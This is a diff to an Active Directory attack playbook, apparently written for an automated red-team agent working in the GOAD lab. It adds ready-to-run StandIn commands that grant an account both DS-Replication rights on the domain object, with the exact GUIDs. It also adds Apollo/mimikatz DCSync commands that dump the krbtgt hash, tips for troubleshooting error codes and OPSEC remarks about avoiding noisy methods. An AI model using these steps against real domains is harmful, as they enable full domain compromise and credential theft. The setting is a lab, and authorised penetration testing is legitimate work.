@@ -82,7 +82,7 @@ a target, this document maps the edge type to the appropriate exploitation techn
 | `ForceChangePassword` | User | Reset password (NOISY — prefer Whisker) | Set-DomainUserPassword |
 | `Owns` | Any | Same as WriteOwner | PowerView |
 | `AllExtendedRights` | User | Whisker OR password reset | Whisker preferred |
-| `GenericAll` | Domain | DCSync rights self-grant | lsadump::dcsync / apollo dcsync |
+| `GenericAll`/`WriteDACL`/`WriteOwner` | Domain | Grant self the two DS-Replication extended rights → DCSync | **StandIn** `--object <domain-DN> --grant --guid` (non-PS, both GUIDs) → then `apollo dcsync` / `lsadump::dcsync` · PowerView `Add-DomainObjectAcl -Rights DCSync` only if loaded — see "DCSync via WriteDACL on Domain" below + `ttps/standin.md` |
 
 ## Non-PowerShell execution (OPSEC-scoped / inline-assembly only)
 
@@ -114,10 +114,36 @@ reset is acceptable and simpler.
 
 ## DCSync via WriteDACL on Domain
 
+DCSync requires TWO extended rights on the domain object: `DS-Replication-Get-Changes`
+(`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All`
+(`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`). When you hold `WriteDACL`/`GenericAll`/`WriteOwner` on the
+domain head, grant yourself both, then DCSync.
+
+**Read the GetNCChanges error code first:** `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** = you lack the
+replication rights → apply the grant below. `0x20f7` / **8439 `DS_DRA_BAD_DN`** = wrong/invalid naming
+context → this is a **targeting** bug (wrong forest/DN/DC), NOT a rights problem; fix the target first
+(see per-forest note below). Do not grant rights to "fix" an 8439.
+
+**Non-PowerShell (OPSEC-scoped / autonomous-solve default) — StandIn:**
+
 ```
-# WriteDACL on the domain object → grant self DCSync rights → DCSync
-PowerView: Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" 
-  -PrincipalIdentity attacker -Rights DCSync
-# Then:
-Apollo: dcsync /domain:X /user:krbtgt
+# Grant BOTH replication extended rights on the TARGET FOREST's domain object, then DCSync
+StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+Apollo:   dcsync /domain:essos.local /user:krbtgt          # target the SAME DC you granted on (meereen),
+                                                           # as the granted principal; latency → 8453 if not
+```
+
+> **Per-forest targeting (the 8439 / malformed-filter trap).** `--object` is the domain DN of the
+> forest you are escalating in, and DCSync must run against **that forest's DC**. In GOAD: ESSOS =
+> `DC=essos,DC=local` via **meereen** (`meereen.essos.local`); NORTH = `DC=north,DC=sevenkingdoms,DC=local`
+> via **winterfell**; root = `DC=sevenkingdoms,DC=local` via **kingslanding**. Granting essos replication
+> rights against winterfell/NORTH (wrong DC + wrong DN) is what produces 8439 and malformed LDAP filters —
+> confirm the DN and DC match the target forest before issuing.
+
+**PowerShell (only if PowerView already loaded — NOT for the no-PS autonomous solve):**
+
+```
+PowerView: Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
+Apollo:    dcsync /domain:X /user:krbtgt
 ```
